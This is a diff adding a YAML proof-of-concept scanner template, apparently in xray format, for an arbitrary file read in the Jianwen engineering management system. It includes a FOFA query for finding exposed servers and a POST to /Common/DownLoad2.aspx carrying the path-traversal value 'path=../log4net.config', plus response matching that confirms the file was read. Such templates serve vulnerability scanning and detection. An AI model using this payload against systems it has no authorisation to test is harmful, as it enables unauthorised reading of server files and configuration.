@@ -1,0 +1,19 @@
+id: poc-yaml-justwin-download2-aspx-anyfile-read
+info:
+  name: 建文工程管理系统 DownLoad2.aspx 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 建文工程管理系统
+  fofa: body="Login/QRLogin.ashx"
+requests:
+- method: POST
+  path: /Common/DownLoad2.aspx
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: path=../log4net.config&Name=
+  expression: "status_code == 200 && \ncontains(body,\"name=\\\"log4net\\\"\") &&\n\
+    contains(body,\"<configuration>\") &&\ncontains(headers,\"filename=\") &&\ncontains(content_type,\"\
+    application/octet-stream\")\n"
+variables: {}
+transport: http
